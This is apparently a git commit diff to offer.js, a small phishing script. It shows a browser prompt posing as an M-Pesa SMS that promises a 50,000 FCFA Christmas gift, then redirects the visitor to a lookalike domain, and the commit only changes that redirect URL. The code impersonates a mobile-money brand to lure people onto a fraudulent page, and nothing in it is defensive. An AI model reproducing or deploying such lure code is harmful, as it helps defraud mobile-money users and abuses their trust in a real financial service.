c07ec45b5bc3ccd09e920258af5b1086337e3155
lagalfredben <lagalfredben@gmail.com>
2025-12-17 05:11:55 +0100

    Update offer.js

--- offer.js
+++ offer.js
@@ -2,7 +2,8 @@
 var password = '50.000FCFA'
 password=prompt('SMS: Félicitations ! Votre compte M-Pesa est éligible pour recevoir le cadeau de Noël M-Pesa de 50.000FCFA. Veuillez cliquer sur OK pour continuer. ','50.000FCFA');
 if (password != '50.000FCFA') {
-location.href='https://mpesa-drc.goprogram.xyz/gift';
+location.href='https://mpesadrc.goprogram.xyz/gift';
 
 }
+
 
